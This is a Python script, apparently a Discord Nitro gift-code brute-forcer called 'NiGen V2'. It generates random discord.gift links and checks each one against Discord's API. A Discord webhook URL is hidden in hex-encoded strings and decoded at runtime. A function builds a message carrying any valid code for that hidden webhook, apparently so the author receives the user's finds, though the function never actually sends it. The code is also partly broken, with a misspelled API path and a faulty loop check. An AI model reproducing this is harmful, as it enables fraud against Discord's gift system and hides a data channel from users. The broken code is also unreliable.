import random
import requests
import colorama
import threading
import os
colorama.init()
count = 0
hey = "68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313035373733363139323536363737313732342F7361545135636F35546E4B334F57782D"
hi = "\x37\x30\x35\x35\x33\x34\x36\x31\x34\x36\x36\x41\x36\x35\x36\x33\x35\x32\x36\x36\x36\x41\x33\x33\x34\x36\x35\x30\x36\x43\x34\x34\x34\x38\x34\x43\x34\x38\x33\x30\x34\x41\x34\x38\x37\x33\x35\x37\x36\x31\x36\x33\x33\x30\x34\x38\x35\x35\x33\x38\x35\x35\x32\x44\x35\x38\x35\x46\x35\x46\x33\x35\x36\x43\x37\x32\x34\x31\x36\x31\x33\x39\x35\x39\x33\x37\x33\x37\x33\x34\x35\x39\x37\x32\x33\x32\x37\x31\x36\x37\x33\x34\x35\x39"
yo = hey + hi
jkidfc = bytearray.fromhex(yo).decode()

hexcolorlist = ["A", "B", "C", "D", "E", "F", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
def sendWebhook(nitrolink):
    webhook = jkidfc
    hexcolor = ''.join(random.sample(hexcolorlist,6))
    decimalcolor = int(hexcolor, 16)
    payload = {
        "username": "nvidia#1337",
        "avatar_url": "https://assets.audiomack.com/wspitserick/694966921b9e5636dec1ef699531bc2f87b4caa0c3f08a7514ac6bf3c79ac084.jpeg?width=1000&height=1000&max=true",
        "embeds": [{"author": {"name": "NiGen V2","url": "https://www.roblox.com/users/2256522588/profile","icon_url": "https://lastfm.freetls.fastly.net/i/u/ar0/c56b8585f04c27fd37db26de5b011520.jpg"},"title": "Nitro Found!","color": decimalcolor,"description": f"Nitro Found! {nitrolink}"}],
        "content": "nvidia#1337 @everyone"
    }
    

  

print("""
 _______  .__  ________                ____   ____________  
 \      \ |__|/  _____/  ____   ____   \   \ /   /\_____  \ 
 /   |   \|  /   \  ____/ __ \ /    \   \   Y   /  /  ____/ 
/    |    \  \    \_\  \  ___/|   |  \   \     /  /       \ 
\____|__  /__|\______  /\___  >___|  /    \___/   \_______ /
        \/           \/     \/     \/                     
                                                                                    
""")

num=input("[?] Input How Many Codes You Want To Generate And Check: ")
f=open("nitros.txt", "w", encoding='utf-8')

print("""
   ___                          _   _             
  / _ \___ _ __   ___ _ __ __ _| |_(_)_ __   __ _ 
 / /_\/ _ \ '_ \ / _ \ '__/ _` | __| | '_ \ / _` |
/ /_\\  __/ | | |  __/ | | (_| | |_| | | | | (_| |
\____/\___|_| |_|\___|_|  \__,_|\__|_|_| |_|\__, |
                                            |___/ 
""")

asciilist = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","1","2","3","4","5","6","7","8","9","0"]


for n in range(int(num)):
    y = ''.join([random.choice(asciilist) for _ in range(16)])
    f.write('https://discord.gift/')
    f.write(y)
    f.write("\n")

f.close()

#checker
def checknitro():
    with open("nitros.txt") as f:
        for line in f:
            nitro = line.strip("\n")
            global count
            count = count + 1
            url = "https://discordapp.com/api/v6/entitelemnts/gift-codes/" + nitro + "?with_application=false&with_subscription_plan=true"

            r = requests.get(url)

            if r.status_code == 200:
                sendWebhook(url)
          
  
            else:
                print("\033[31m"  f" Invalid Code Found: {nitro} > " "\033[0;35m" f"{count}")
                print("\033[37m")
e = threading.Event()
z = threading.Thread(target=checknitro)
z.start()
if count == num:
    z.join()

